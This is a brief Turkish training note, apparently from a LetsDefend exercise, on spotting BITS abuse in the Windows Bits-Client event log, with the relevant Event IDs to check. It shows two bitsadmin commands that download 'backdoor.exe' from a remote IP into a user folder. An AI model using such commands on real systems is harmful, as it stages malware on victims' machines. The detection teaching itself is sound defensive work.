**Applications and Services Logs > Microsoft > Windows > Bits-Client > Operational**

Background Intelligent Transfer Service (BITS), Microsoft tarafından büyük dosyaların arka planda kesintisiz indirilip yüklenmesini sağlamak için geliştirilmiştir.

•	bitsadmin /create letsdefend_eventlogs
•	bitsadmin /addfile letsdefend_eventlogs http://172.17.79.137/backdoor.exe C:\Users\letsdefend\documents\file.exe

**letsdefend_eventlogs** : Önceden oluşturulmuş BITS işinin adı.
http://172.17.79.137/backdoor.exe : Uzak kaynağın (indirilecek dosyanın) URL’si.
**C:\Users\letsdefend\documents\file.exe** : Dosyanın yerel olarak kaydedileceği yol ve isim

Event ID 3 Bits işi oluşturulduğunda 
Event ID 16403 --> Details --> RemoteName, LocalName Kısımları incelenmeli
Event ID 59 işin ne zaman başlatıldığını --> remoteName gözlemlenebilir.
Event ID 60 The status code ise 0x0 Olayın başarılı olduğunu gösterir.
Event ID 4  işin tamamlandığını belirten bir olayı oluşturulacaktır.
